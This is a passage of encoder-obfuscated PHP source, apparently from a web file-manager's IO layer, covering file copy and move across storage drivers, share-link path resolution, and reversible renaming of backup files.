$Ğ¡ÄÈï), $÷ºÌŸÃ[1278]); $ù¶±’×¶ = implode(PHP_EOL, $ù¶±’×¶); if ($¯Šæ†Âˆ == $÷ºÌŸÃ[910]) { return $ù¶±’×¶; } $­Ÿ™ãå[$÷ºÌŸÃ[910]] = $ù¶±’×¶; return $­Ÿ™ãå; } private function escapeName($Æ¥¹û¹ó, $ÓîôõÖ = "\x6d\x79\x73\161\x6c") { $”åô§öŸ =& $_SERVER[Ï×Œõ”û]; $Æ¥¹û¹ó = preg_replace($”åô§öŸ[1279], $”åô§öŸ[12], $Æ¥¹û¹ó); if ($ÓîôõÖ === $”åô§öŸ[910]) { return "\140{$Æ¥¹û¹ó}\x60"; } return "\x22{$Æ¥¹û¹ó}\42"; } public function mixBakList($¤ì¨ô˜) { $±êÕïñÇ =& $_SERVER[Ï×Œõ”û]; $¤ì¨ô˜ = rtrim($¤ì¨ô˜, $±êÕïñÇ[8]) . $±êÕïñÇ[8]; $óÛ¼¤ë§ = $±êÕïñÇ[1280]; $Ô¼–Û¤ğ = IO::listPath($¤ì¨ô˜); if (empty($Ô¼–Û¤ğ[$±êÕïñÇ[86]])) { return !1; } $—š‹Á¢ = array(); foreach ($Ô¼–Û¤ğ[$±êÕïñÇ[86]] as $Ãº½©ş => $—±½ïí‘) { if (!$—±½ïí‘[$±êÕïñÇ[32]] || !$—±½ïí‘[$±êÕïñÇ[87]]) { continue; } $ŞÅ³²‹ = Mcrypt::encode($—±½ïí‘[$±êÕïñÇ[32]], $óÛ¼¤ë§); $€ó½ì’Õ = md5($ŞÅ³²‹); IO::rename($—±½ïí‘[$±êÕïñÇ[87]], $€ó½ì’Õ); $—š‹Á¢[$€ó½ì’Õ] = $ŞÅ³²‹; } $¶ğñïØ¶ = md5($±êÕïñÇ[1281] . $óÛ¼¤ë§); IO::setContent($¤ì¨ô˜ . $¶ğñïØ¶, json_encode($—š‹Á¢)); return !0; } public function unmixBakList($‰ÄµÛÛÊ) { $÷™¯—Î =& $_SERVER[Ï×Œõ”û]; $‰ÄµÛÛÊ = rtrim($‰ÄµÛÛÊ, $÷™¯—Î[8]) . $÷™¯—Î[8]; $Ø¥·»Ë = $this->unmixBakListGet($‰ÄµÛÛÊ, !0); if (empty($Ø¥·»Ë)) { return !1; } foreach ($Ø¥·»Ë as $Òüˆ«®Ÿ => $ó£‰˜‘Û) { $¸ÍáÚ‚º = IO::rename($‰ÄµÛÛÊ . $ó£‰˜‘Û, $Òüˆ«®Ÿ); if (!$¸ÍáÚ‚º) { return !1; } } return !0; } public function unmixBakListGet($€êöî¦÷, $€†İù¯À = false) { $‰¢ê‘ÕÇ =& $_SERVER[Ï×Œõ”û]; $€êöî¦÷ = rtrim($€êöî¦÷, $‰¢ê‘ÕÇ[8]) . $‰¢ê‘ÕÇ[8]; $è‚²ş³Ç = $‰¢ê‘ÕÇ[1280]; $äìÖÚ™ = md5($‰¢ê‘ÕÇ[1281] . $è‚²ş³Ç); $ùå¨õ÷î = $€êöî¦÷ . $äìÖÚ™; if (!IO::exist($ùå¨õ÷î)) { return !1; } $Ñà±á™ã = json_decode(IO::getContent($ùå¨õ÷î), !0); if (empty($Ñà±á™ã)) { return !1; } $óÕİåú¯ = array(); foreach ($Ñà±á™ã as $šŒíöÍö => $ÆäƒÌ¶ä) { $äìÖÚ™ = Mcrypt::decode($ÆäƒÌ¶ä, $è‚²ş³Ç); $óÕİåú¯[$äìÖÚ™] = $šŒíöÍö; } if ($€†İù¯À) { IO::remove($ùå¨õ÷î, !1); } return $óÕİåú¯; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($ùô·Á»¡, $Ïàõœ†ó) { $ƒ·‰¬²• =& $_SERVER[Ï×Œõ”û]; $İ¯£³äô = $Ïàõœ†ó; $GLOBALS[$ƒ·‰¬²•[1282]] = $ƒ·‰¬²•[1283] . $ùô·Á»¡; Hook::trigger($ƒ·‰¬²•[1283] . $ùô·Á»¡ . $ƒ·‰¬²•[1284], $İ¯£³äô); $ÙüËì±ˆ = self::driverMake($Ïàõœ†ó[0]); if (!$ÙüËì±ˆ) { return !1; } if ($ùô·Á»¡ == $ƒ·‰¬²•[646] || $ùô·Á»¡ == $ƒ·‰¬²•[648] || $ùô·Á»¡ == $ƒ·‰¬²•[1285]) { if (!trim($ÙüËì±ˆ->path . $ƒ·‰¬²•[464], $ƒ·‰¬²•[8])) { return !1; } } if (method_exists($ÙüËì±ˆ, $ùô·Á»¡)) { $°åÀ©Óı = @call_user_func_array(array($ÙüËì±ˆ, $ùô·Á»¡), $Ïàõœ†ó); } else { if (method_exists($ÙüËì±ˆ, $ƒ·‰¬²•[1286])) { $°åÀ©Óı = @call_user_func_array(array($ÙüËì±ˆ, $ùô·Á»¡), $Ïàõœ†ó); } else { if (method_exists(self, $ùô·Á»¡)) { $°åÀ©Óı = @call_user_func_array(array(self, $ùô·Á»¡), $Ïàõœ†ó); } else { $°åÀ©Óı = call_user_func_array(array(parent, $ùô·Á»¡), $Ïàõœ†ó); } } } Hook::trigger($ƒ·‰¬²•[1283] . $ùô·Á»¡ . $ƒ·‰¬²•[1287], $İ¯£³äô, $°åÀ©Óı); return $°åÀ©Óı; } public static function init($…à’‡¤Ï) { return self::driverMake($…à’‡¤Ï); } public static function copy($ßö³¥ƒÀ, $ñŠ‡æá‡, $»¬ö‰Œ‹ = false, $‡Îñ—ç = false) { return self::copyMoveStart($ßö³¥ƒÀ, $ñŠ‡æá‡, $»¬ö‰Œ‹, $_SERVER[Ï×Œõ”û][646], $‡Îñ—ç); } public static function move($ÓŠ ‚È, $ìıçÖ„², $¦º²ä†Í = false, $şàä’û† = false) { return self::copyMoveStart($ÓŠ ‚È, $ìıçÖ„², $¦º²ä†Í, $_SERVER[Ï×Œõ”û][648], $şàä’û†); } public static function copyMoveChildren($’‰¹±œ, $íµôé¤, $¢İÍ”ó‚ = "\143\157\x70\171", $š”±³–° = REPEAT_REPLACE) { $Ğ³ƒˆøØ =& $_SERVER[Ï×Œõ”û]; $¡ÚÁğœ¨ = $’‰¹±œ; $¡„à÷É÷ = self::driverMake($’‰¹±œ); $•½öÖ¦ = $¡„à÷É÷->listPath($’‰¹±œ, !0); $ò‹€êÂ³ = array_merge($•½öÖ¦[$Ğ³ƒˆøØ[86]], $•½öÖ¦[$Ğ³ƒˆøØ[85]]); foreach ($ò‹€êÂ³ as $†¸°È£Ã) { self::copyMoveStart($†¸°È£Ã[$Ğ³ƒˆøØ[87]], $íµôé¤, $š”±³–°, $¢İÍ”ó‚, !1); } if ($¢İÍ”ó‚ == $Ğ³ƒˆøØ[648]) { self::remove($¡ÚÁğœ¨); } } private static function copyMoveStart($‰´‰””‰, $ƒğ¶”“õ, $Å¨“ş‹, $Éì¡ã˜³, $Ó”³ù¼) { $‡ÁÙÔÂˆ =& $_SERVER[Ï×Œõ”û]; $”ò²íµ§ = array($‰´‰””‰, $ƒğ¶”“õ, $Å¨“ş‹, $Ó”³ù¼); Hook::trigger($‡ÁÙÔÂˆ[1283] . $Éì¡ã˜³ . $‡ÁÙÔÂˆ[1284], $”ò²íµ§); $Å°òšŸ¡ = self::copyMove($‰´‰””‰, $ƒğ¶”“õ, $Å¨“ş‹, $Éì¡ã˜³, $Ó”³ù¼); Hook::trigger($‡ÁÙÔÂˆ[1283] . $Éì¡ã˜³ . $‡ÁÙÔÂˆ[1287], $”ò²íµ§, $Å°òšŸ¡); return $Å°òšŸ¡; } public static function saveFile($ÚÛ½, $‘èÕŠ§’, $‹«®ÏÓ“ = true) { $´†èúÚª =& $_SERVER[Ï×Œõ”û]; $ÜŸĞ­¡Ğ = self::info($‘èÕŠ§’); $ÛÔõÉÛÆ = self::driverMake($ÚÛ½); $å×äÑ¸ = self::driverMake($‘èÕŠ§’); $ƒä³ñ£À = !1; if ($å×äÑ¸->pathParse[$´†èúÚª[1288]]) { $ƒä³ñ£À = $å×äÑ¸; $’òç¼ê¯ = $å×äÑ¸->pathParse[$´†èúÚª[1288]]; $å×äÑ¸ = self::driverMake($’òç¼ê¯); } if ($ÛÔõÉÛÆ->pathParse[$´†èúÚª[1288]]) { $ĞÖÛŞÆ = $ÛÔõÉÛÆ->pathParse[$´†èúÚª[1288]]; $ÛÔõÉÛÆ = self::driverMake($ĞÖÛŞÆ); } $„‘À©Ô = $å×äÑ¸->pathFather($‘èÕŠ§’); $ü —‹¡Ò = !0; if (!$‹«®ÏÓ“ && self::driverIsSame($ÛÔõÉÛÆ, $å×äÑ¸)) { $ü —‹¡Ò = !1; } $ˆâ¼…¦Ø = self::copyFile($ÛÔõÉÛÆ, $ÚÛ½, $å×äÑ¸, $„‘À©Ô, $ÜŸĞ­¡Ğ[$´†èúÚª[32]], $ü —‹¡Ò); if ($ƒä³ñ£À) { $ˆâ¼…¦Ø = $ƒä³ñ£À->getPathOuter($ˆâ¼…¦Ø); } return $ˆâ¼…¦Ø; } private static function copyMove($ãÄ±÷ª, $„æÄÈô…, $ö ¿º§, $ıòß±¾Æ, $Ú–„†âè = false) { $¯¨ò»î“ =& $_SERVER[Ï×Œõ”û]; if (!$ãÄ±÷ª || $ãÄ±÷ª == $¯¨ò»î“[8] || !$„æÄÈô…) { return !1; } ignore_timeout(); $ÏÒ«ø¦ = self::driverMake($ãÄ±÷ª); $¦¼¸İØ = self::driverMake($„æÄÈô…); $µÉËÂ°¶ = $ıòß±¾Æ == $¯¨ò»î“[648]; $Í›·¿ÏÇ = !1; if ($¦¼¸İØ->pathParse[$¯¨ò»î“[1288]]) { $Í›·¿ÏÇ = $¦¼¸İØ; $„æÄÈô… = $¦¼¸İØ->pathParse[$¯¨ò»î“[1288]]; $¦¼¸İØ = self::driverMake($„æÄÈô…); } if ($ÏÒ«ø¦->pathParse[$¯¨ò»î“[1288]]) { $ãÄ±÷ª = $ÏÒ«ø¦->pathParse[$¯¨ò»î“[1288]]; $ÏÒ«ø¦ = self::driverMake($ãÄ±÷ª); } self::check($ÏÒ«ø¦, $ãÄ±÷ª, $¦¼¸İØ, $„æÄÈô…); Hook::trigger($¯¨ò»î“[1289], $ÏÒ«ø¦, $ãÄ±÷ª, $¦¼¸İØ, $„æÄÈô…); $’éò¾ÃÁ = self::driverIsSame($ÏÒ«ø¦, $¦¼¸İØ); if ($’éò¾ÃÁ) { if ($ıòß±¾Æ == $¯¨ò»î“[648] && !method_exists($¦¼¸İØ, $¯¨ò»î“[1290]) && trim($„æÄÈô…, $¯¨ò»î“[8]) == trim($¦¼¸İØ->pathFather($ãÄ±÷ª), $¯¨ò»î“[8])) { if ($ÏÒ«ø¦->pathThis($ãÄ±÷ª) != $Ú–„†âè && !$ÏÒ«ø¦->isOsDriver()) { return $ÏÒ«ø¦->rename($ãÄ±÷ª, $Ú–„†âè); } return $¦¼¸İØ->getPathOuter($ãÄ±÷ª); } if (method_exists($¦¼¸İØ, $ıòß±¾Æ)) { return $¦¼¸İØ->{$ıòß±¾Æ}($ãÄ±÷ª, $„æÄÈô…, $ö ¿º§, $Ú–„†âè); } } if ($’éò¾ÃÁ && $ıòß±¾Æ == $¯¨ò»î“[648] && $¦¼¸İØ->getType() == $¯¨ò»î“[107]) { $Ú®Ñæ = $¦¼¸İØ->movePath($ãÄ±÷ª, $„æÄÈô…, $Ú–„†âè); if ($Ú®Ñæ) { return $Ú®Ñæ; } } $ÉáÎßù = $ÏÒ«ø¦->isFile($ãÄ±÷ª); if (!$ÉáÎßù && $¦¼¸İØ->getType() == $¯¨ò»î“[864] && $ÏÒ«ø¦->getType() == $¯¨ò»î“[107]) { $Ú®Ñæ = $¦¼¸İØ->copyFolderFromIO($ÏÒ«ø¦, $ãÄ±÷ª, $„æÄÈô…, $ö ¿º§, $µÉËÂ°¶, $Ú–„†âè); } else { $Ú®Ñæ = self::copyPath($ÏÒ«ø¦, $ãÄ±÷ª, $¦¼¸İØ, $„æÄÈô…, $ö ¿º§, $µÉËÂ°¶, $ÉáÎßù, $Ú–„†âè); } if ($Ú®Ñæ && $µÉËÂ°¶) { $ÏÒ«ø¦->remove($ãÄ±÷ª); } if ($Í›·¿ÏÇ) { $Ú®Ñæ = $Í›·¿ÏÇ->getPathOuter($Ú®Ñæ); } return $Ú®Ñæ; } private static function check($Ê»·öÜ‘, $ùî¯î×Í, $ÓÜ¥âíå, &$‰ùÚ’éè) { $Ş ¥ûğË =& $_SERVER[Ï×Œõ”û]; if (self::driverIsSame($Ê»·öÜ‘, $ÓÜ¥âíå) && $Ê»·öÜ‘->isFolder($ùî¯î×Í) && $Ê»·öÜ‘->isParentOf($ùî¯î×Í, $‰ùÚ’éè)) { show_json(LNG($Ş ¥ûğË[1291]), !1); } if (!$Ê»·öÜ‘->exist($ùî¯î×Í)) { show_json(LNG($Ş ¥ûğË[106]), !1); } } private static function copyPath($Ïåı‡Ö, $ÓÅ­€, $ªªÜå¤Æ, $â£ÖŠñ, $™Àù»µĞ, $†ÛÏíÏ˜, $ÜóÀ¯¼ò, $óş™™óô = false, $§ğŠÛşö = true) { $†ôÉıòî =& $_SERVER[Ï×Œõ”û]; $©¯ÑÈ¨Ç = empty($óş™™óô) && $óş™™óô !== $†ôÉıòî[230] ? $Ïåı‡Ö->pathThis($ÓÅ­€) : $óş™™óô; if ($™Àù»µĞ) { $ú¬­é¢ = $ªªÜå¤Æ->fileNameExist($â£ÖŠñ, $©¯ÑÈ¨Ç); $Ã’Âûº† = $©¯ÑÈ¨Ç; $©¯ÑÈ¨Ç = $ªªÜå¤Æ->fileNameAuto($â£ÖŠñ, $©¯ÑÈ¨Ç, $™Àù»µĞ, !$ÜóÀ¯¼ò); if (!$ú¬­é¢ || $Ã’Âûº† != $©¯ÑÈ¨Ç) { $™Àù»µĞ = !1; } if ($§ğŠÛşö && !$™Àù»µĞ) { $ªªÜå¤Æ->_data[$†ôÉıòî[1292]] = !0; } } if ($ÜóÀ¯¼ò) { return self::copyFile($Ïåı‡Ö, $ÓÅ­€, $ªªÜå¤Æ, $â£ÖŠñ, $©¯ÑÈ¨Ç, $†ÛÏíÏ˜); } if ($™Àù»µĞ == REPEAT_RENAME_FOLDER) { $™Àù»µĞ = !1; } $Ğ²ò«¼ß = rtrim($â£ÖŠñ, $†ôÉıòî[8]) . $†ôÉıòî[8] . $©¯ÑÈ¨Ç; $ªïºÔÎ = $ªªÜå¤Æ->mkdir($ªªÜå¤Æ->getPath($Ğ²ò«¼ß), $™Àù»µĞ); $â£ÖŠñ = $ªªÜå¤Æ->getPathInner($ªïºÔÎ); $©ôÄõ“Ñ = $Ïåı‡Ö->listPath($ÓÅ­€, !0); $©ôÄõ“Ñ = is_array($©ôÄõ“Ñ) ? $©ôÄõ“Ñ : array($†ôÉıòî[86] => array(), $†ôÉıòî[85] => array()); $·ûõŸ±Ù = array_merge($©ôÄõ“Ñ[$†ôÉıòî[86]], $©ôÄõ“Ñ[$†ôÉıòî[85]]); foreach ($·ûõŸ±Ù as $æ†Ïşù€) { $ »ó¤³ø = $æ†Ïşù€[$†ôÉıòî[33]] == $†ôÉıòî[232]; $ÓÅ­€ = $Ïåı‡Ö->getPathInner($æ†Ïşù€[$†ôÉıòî[87]]); $òÂóÁı = self::copyPath($Ïåı‡Ö, $ÓÅ­€, $ªªÜå¤Æ, $â£ÖŠñ, $™Àù»µĞ, $†ÛÏíÏ˜, $ »ó¤³ø, !1, !1); if (!$òÂóÁı) { IO::errorTips($†ôÉıòî[1293] . $ÓÅ­€ . $†ôÉıòî[73] . $â£ÖŠñ); } } self::copyMoveKeepInfo($Ïåı‡Ö, $ÓÅ­€, $ªïºÔÎ); return $ªïºÔÎ; } private static function copyFile($Äüø´ãÚ, $‰³è ğè, $éÈÙ“å, $îŸ‡ªÇ÷, $¤öŠË¸¦, $ÁİõÛû) { $Ú©¡°‰õ =& $_SERVER[Ï×Œõ”û]; $îŸ‡ªÇ÷ = $éÈÙ“å->getPath(rtrim($îŸ‡ªÇ÷, $Ú©¡°‰õ[8]) . $Ú©¡°‰õ[8] . $¤öŠË¸¦); $˜Ò„¶òÑ = $Ú©¡°‰õ[1294] . time() . rand_string(5); Hook::trigger($Ú©¡°‰õ[1295], $Äüø´ãÚ, $‰³è ğè, $éÈÙ“å, $îŸ‡ªÇ÷, $¤öŠË¸¦, $˜Ò„¶òÑ); if (self::driverIsSame($Äüø´ãÚ, $éÈÙ“å)) { if ($ÁİõÛû) { $ßŒ™Àà½ = $éÈÙ“å->moveFile($‰³è ğè, $îŸ‡ªÇ÷); } else { $ßŒ™Àà½ = $éÈÙ“å->copyFile($‰³è ğè, $îŸ‡ªÇ÷); } Hook::trigger($Ú©¡°‰õ[1296], $Äüø´ãÚ, $‰³è ğè, $éÈÙ“å, $îŸ‡ªÇ÷, $¤öŠË¸¦, $ßŒ™Àà½); self::copyMoveKeepInfo($Äüø´ãÚ, $‰³è ğè, $ßŒ™Àà½); return $ßŒ™Àà½; } $ä¯¨‹Š = TEMP_FILES; if ($GLOBALS[$Ú©¡°‰õ[6]][$Ú©¡°‰õ[92]][$Ú©¡°‰õ[907]]) { $ä¯¨‹Š = $GLOBALS[$Ú©¡°‰õ[6]][$Ú©¡°‰õ[92]][$Ú©¡°‰õ[907]]; } $ŸÛ“¤âÏ = $ä¯¨‹Š; mk_dir($ŸÛ“¤âÏ); $œ’¼ê²Á = $ŸÛ“¤âÏ . $˜Ò„¶òÑ; $ˆ”òŞº = $œ’¼ê²Á; $œ’¼ê²Á = $Äüø´ãÚ->download($‰³è ğè, $œ’¼ê²Á); $œ’¼ê²Á = $Äüø´ãÚ->iconvApp($œ’¼ê²Á); if (substr($œ’¼ê²Á, strlen($ä¯¨‹Š)) == $ä¯¨‹Š) { $ÁİõÛû = !0; } $ßŒ™Àà½ = $éÈÙ“å->upload($îŸ‡ªÇ÷, $œ’¼ê²Á, $ÁİõÛû); self::remove($ˆ”òŞº); Hook::trigger($Ú©¡°‰õ[1296], $Äüø´ãÚ, $‰³è ğè, $éÈÙ“å, $îŸ‡ªÇ÷, $¤öŠË¸¦, $ßŒ™Àà½); self::copyMoveKeepInfo($Äüø´ãÚ, $‰³è ğè, $ßŒ™Àà½); return $ßŒ™Àà½; } private static function copyMoveKeepInfo($üÉö’Œç, $“î¸çñ, $æÁø´³´) { if (!$æÁø´³´) { return; } $ıŸ©šıÍ = $üÉö’Œç->info($“î¸çñ); if (!is_array($ıŸ©šıÍ)) { return; } IO::setModifyTime($æÁø´³´, $ıŸ©šıÍ[$_SERVER[Ï×Œõ”û][88]]); } public static function pathFather($¡ïÑÒâ) { $£Åã™Àñ = IO::init($¡ïÑÒâ); $Àß†Œ´î = $£Åã™Àñ->pathFather($£Åã™Àñ->path); return $£Åã™Àñ->getPathOuter($Àß†Œ´î); } public static function fileOut($üßå¾ˆ‘, $˜ä†·ç = false, $ÒÃœ÷ù‹ = false, $ë–ƒ•ƒ = '') { $‹óŒ‘¦ = self::driverMake($üßå¾ˆ‘); if ($‹óŒ‘¦->isFileOutServer()) { return $‹óŒ‘¦->fileOutServer($üßå¾ˆ‘, $˜ä†·ç, $ÒÃœ÷ù‹, $ë–ƒ•ƒ); } return $‹óŒ‘¦->fileOut($üßå¾ˆ‘, $˜ä†·ç, $ÒÃœ÷ù‹, $ë–ƒ•ƒ); } public static function fileOutImage($šÌ¶ï‡ç, $×åØöıó = 250) { $û í¨‡ï = array(250, 600, 1200, 2000, 3000, 5000); for ($šúîà‘Ğ = 0; $šúîà‘Ğ < count($û í¨‡ï); $šúîà‘Ğ++) { if ($šúîà‘Ğ == 0 && $×åØöıó <= $û í¨‡ï[$šúîà‘Ğ]) { $×åØöıó = $û í¨‡ï[$šúîà‘Ğ]; break; } else { if ($×åØöıó > $û í¨‡ï[$šúîà‘Ğ - 1] && $×åØöıó <= $û í¨‡ï[$šúîà‘Ğ]) { $×åØöıó = $û í¨‡ï[$šúîà‘Ğ]; break; } else { if ($šúîà‘Ğ == count($û í¨‡ï) - 1 && $×åØöıó > $û í¨‡ï[$šúîà‘Ğ]) { $×åØöıó = $û í¨‡ï[$šúîà‘Ğ]; break; } } } } $ô¹ù‚Â³ = self::driverMake($šÌ¶ï‡ç); if ($ô¹ù‚Â³->isFileOutServer()) { return $ô¹ù‚Â³->fileOutImageServer($šÌ¶ï‡ç, $×åØöıó); } return $ô¹ù‚Â³->fileOutImage($šÌ¶ï‡ç, $×åØöıó); } private static function driverIsSame($Ø–¥€Ğ, $·øšı£Ç) { $ôØÄ×– =& $_SERVER[Ï×Œõ”û]; $ÃÏá»µ = $Ø–¥€Ğ->getType(); $ì‰ÕÊñ“ = $·øšı£Ç->getType(); if ($ÃÏá»µ != $ì‰ÕÊñ“) { return !1; } if ($ÃÏá»µ == $ôØÄ×–[864]) { return !0; } if ($ÃÏá»µ == $ôØÄ×–[107]) { return !0; } if ($Ø–¥€Ğ->pathDriver == $·øšı£Ç->pathDriver) { return !0; } return !1; } public static function copyUpdate($íêğ©, $ĞöŞæÜ) { $æº®œ =& $_SERVER[Ï×Œõ”û]; if (!IO::exist($íêğ©)) { return !1; } if (!IO::exist($ĞöŞæÜ)) { IO::mkdir($ĞöŞæÜ); } $—®ıø¡í = array_to_keyvalue(self::listAllSimple($íêğ©), $æº®œ[87]); $ÜŒ·½èª = array_to_keyvalue(self::listAllSimple($ĞöŞæÜ), $æº®œ[87]); $Â…ç”¼ = array(); $¢Ó™—  = array(); foreach ($—®ıø¡í as $“—”¤÷’ => $í‹¢‚Ä) { if (isset($ÜŒ·½èª[$“—”¤÷’])) { if ($í‹¢‚Ä[$æº®œ[78]] == 1) { continue; } if ($ÜŒ·½èª[$“—”¤÷’][$æº®œ[79]] == $í‹¢‚Ä[$æº®œ[79]]) { continue; } } if ($í‹¢‚Ä[$æº®œ[78]] == 1) { $¢Ó™— [] = $ĞöŞæÜ . $æº®œ[8] . trim($“—”¤÷’, $æº®œ[8]); continue; } $ˆéª‡Ö˜ = strstr(trim($“—”¤÷’, $æº®œ[8]), $æº®œ[8]) ? get_path_father($“—”¤÷’) : $æº®œ[12]; $Â…ç”¼[] = array($æº®œ[1297] => $í‹¢‚Ä[$æº®œ[89]], $æº®œ[1298] => rtrim($ĞöŞæÜ, $æº®œ[8]) . $æº®œ[8] . $ˆéª‡Ö˜, $æº®œ[1299] => $í‹¢‚Ä); } $’ŒÍÆ¢ = array($æº®œ[232] => $Â…ç”¼, $æº®œ[78] => $¢Ó™— ); Hook::trigger($æº®œ[1300], $íêğ©, $ĞöŞæÜ, $’ŒÍÆ¢); foreach ($¢Ó™—  as $í‹¢‚Ä) { IO::mkdir($í‹¢‚Ä); } foreach ($Â…ç”¼ as $í‹¢‚Ä) { IO::copy($í‹¢‚Ä[$æº®œ[1297]], $í‹¢‚Ä[$æº®œ[1298]], REPEAT_REPLACE); } } public static function fileSubstr($©œ˜Èš, $ÔËŒæİÉ, $ıâ©«Ê = false) { $‰Øãİ =& $_SERVER[Ï×Œõ”û]; $Æ§™ôş = self::driverMake($©œ˜Èš); $£è“¤İ± = $Æ§™ôş->size($©œ˜Èš); $éŞÆ°ñ = $ÔËŒæİÉ; $Ù×‡Ô– = $ıâ©«Ê; if ($ÔËŒæİÉ < 0) { $ÔËŒæİÉ = $£è“¤İ± + $ÔËŒæİÉ; } if ($ıâ©«Ê === !1) { $ıâ©«Ê = $£è“¤İ± - $ÔËŒæİÉ; } if ($ÔËŒæİÉ + $ıâ©«Ê > $£è“¤İ±) { $ıâ©«Ê = $£è“¤İ± - $ÔËŒæİÉ; } if (!$£è“¤İ± && $Æ§™ôş->getType() == $‰Øãİ[107] && !$Æ§™ôş->exist($©œ˜Èš)) { $ü‚ô¦½‚ = get_path_this($©œ˜Èš); $ŸÃü¢õ = parse_url_query($ü‚ô¦½‚); if (is_array($ŸÃü¢õ) && isset($ŸÃü¢õ[$‰Øãİ[32]])) { $ü‚ô¦½‚ = urldecode($ŸÃü¢õ[$‰Øãİ[32]]); } throw new Exception($‰Øãİ[1301] . LNG($‰Øãİ[1302]) . $‰Øãİ[1087] . clear_html($ü‚ô¦½‚) . $‰Øãİ[12]); } if ($ıâ©«Ê <= 0) { return $‰Øãİ[12]; } if ($ÔËŒæİÉ < 0 || $ÔËŒæİÉ >= $£è“¤İ± || $ıâ©«Ê > $GLOBALS[$‰Øãİ[6]][$‰Øãİ[92]][$‰Øãİ[1303]]) { throw new Exception("\x66\x69\154\x65\122\145\141\144\40\x65\x72\x72\157\162\54\157\x76\x65\x72\40\151\x6f\x52\145\x61\x64\x4d\141\170\x21\40\163\x74\141\x72\x74\75{$ÔËŒæİÉ}\73\154\x65\x6e\x67\x74\x68\75{$ıâ©«Ê}\73\40\163\151\172\145\x3d{$£è“¤İ±}\73"); } $ˆ”òş = $Æ§™ôş->fileSubstr($©œ˜Èš, $ÔËŒæİÉ, $ıâ©«Ê); if (!$ˆ”òş && $ıâ©«Ê && isset($GLOBALS[$‰Øãİ[1304]])) { throw new Exception($GLOBALS[$‰Øãİ[1304]][$‰Øãİ[1305]]); } return $ˆ”òş; } private static function driverMake(&$¢†ïçÖî) { $¨µé Í =& $_SERVER[Ï×Œõ”û]; $ŠâÁĞ¼ = KodIO::parse($¢†ïçÖî); if (!self::$driverListSystem) { $äùëàÙ‰ = Model($¨µé Í[874])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($äùëàÙ‰, $¨µé Í[484]); } if ($ŠâÁĞ¼[$¨µé Í[33]] == KodIO::KOD_IO && !self::$driverListSystem[$ŠâÁĞ¼[$¨µé Í[484]]]) { throw new Exception($¨µé Í[1306]); return !1; } $¢†ïçÖî = $ŠâÁĞ¼[$¨µé Í[1307]]; $ıÍ±ò‘Ï = self::driverGet($ŠâÁĞ¼, $¢†ïçÖî); return $ıÍ±ò‘Ï; } private static function driverGet($èúË‡‚µ, &$”õËÊßı) { $Çî›—ã =& $_SERVER[Ï×Œõ”û]; $¬È¬êŠ = $èúË‡‚µ[$Çî›—ã[1308]]; $ÅÕ‰¯» = $èúË‡‚µ[$Çî›—ã[484]]; switch ($èúË‡‚µ[$Çî›—ã[33]]) { case KodIO::KOD_IO: $ ŞÚäğ = self::$driverListSystem[$ÅÕ‰¯»]; break; case KodIO::KOD_SOURCE: $”õËÊßı = $ÅÕ‰¯» . $”õËÊßı; $ ŞÚäğ = array($Çî›—ã[1309] => $Çî›—ã[1310], $Çî›—ã[6] => $èúË‡‚µ); $ ŞÚäğ[$Çî›—ã[6]][$Çî›—ã[1311]] = $èúË‡‚µ[$Çî›—ã[484]]; break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $™á»’—ú = $GLOBALS[$Çî›—ã[1312]]; self::$driverListUser = array_to_keyvalue($™á»’—ú, $Çî›—ã[484]); } $ ŞÚäğ = self::$driverListUser[$ÅÕ‰¯»]; break; case KodIO::KOD_SHARE_LINK: $ ŞÚäğ = array($Çî›—ã[1309] => $Çî›—ã[1313], $Çî›—ã[6] => $èúË‡‚µ); $ğáÇÛé¦ = Action($Çî›—ã[1314])->sharePathInfo($èúË‡‚µ[$Çî›—ã[87]]); $”õËÊßı = $ğáÇÛé¦[$Çî›—ã[193]]; if (!$ğáÇÛé¦[$Çî›—ã[193]]) { $Ô´åÎÓ» = Model($Çî›—ã[692])->getInfoByHash($èúË‡‚µ[$Çî›—ã[484]]); $”õËÊßı = KodIO::clear($Ô´åÎÓ»[$Çî›—ã[588]] . $èúË‡‚µ[$Çî›—ã[1307]]); $èúË‡‚µ[$Çî›—ã[581]] = $Ô´åÎÓ»; $èúË‡‚µ[$Çî›—ã[1288]] = $”õËÊßı; $ ŞÚäğ = array($Çî›—ã[1309] => $Çî›—ã[1315], $Çî›—ã[6] => $èúË‡‚µ); } else { $ ŞÚäğ[$Çî›—ã[6]][$Çî›—ã[1311]] = $ğáÇÛé¦[$Çî›—ã[193]]; } break; case KodIO::KOD_SHARE_ITEM: $ ŞÚäğ = array($Çî›—ã[1309] => $Çî›—ã[1316], $Çî›—ã[6] => $èúË‡‚µ); $Ô´åÎÓ» = Model($Çî›—ã[692])->getInfo($èúË‡‚µ[$Çî›—ã[484]]); if ($Ô´åÎÓ»[$Çî›—ã[193]] == $Çî›—ã[230]) { $”õËÊßı = KodIO::clear($Ô´åÎÓ»[$Çî›—ã[588]] . $èúË‡‚µ[$Çî›—ã[1307]]); $èúË‡‚µ[$Çî›—ã[581]] = $Ô´åÎÓ»; $èúË‡‚µ[$Çî›—ã[1288]] = $”õËÊßı; $ ŞÚäğ = array($Çî›—ã[1309] => $Çî›—ã[1317], $Çî›—ã[6] => $èúË‡‚µ); } else { if (!$”õËÊßı) { $”õËÊßı = $Ô´åÎÓ»[$Çî›—ã[193]]; } $ ŞÚäğ[$Çî›—ã[6]][$Çî›—ã[1311]] = $Ô´åÎÓ»[$Çî›—ã[193]]; } break; case KodIO::KOD_SHARE_OUTER: $ ŞÚäğ = array($Çî›—ã[1309] => $Çî›—ã[1318], $Çî›—ã[6] => $èúË‡‚µ); break; default: $”õËÊßı = $èúË‡‚µ[$Çî›—ã[87]]; $ ŞÚäğ = array($Çî›—ã[1309] => $Çî›—ã[1319]); break; } $…–Ü¢†Â = $èúË‡‚µ[$Çî›—ã[87]]; if (!isset(self::$driverCache[$…–Ü¢†Â])) { $“”óñõ = strtolower($ ŞÚäğ[$Çî›—ã[96]]); $Ïü”êÚ¦ = $GLOBALS[$Çî›—ã[6]][$Çî›—ã[92]][$Çî›—ã[940]]; $î÷‚”ÒÆ = $Çî›—ã[77] . (isset($Ïü”êÚ¦[$“”óñõ]) ? $Ïü”êÚ¦[$“”óñõ] : ucfirst($“”óñõ)); if (!class_exists($î÷‚”ÒÆ)) { 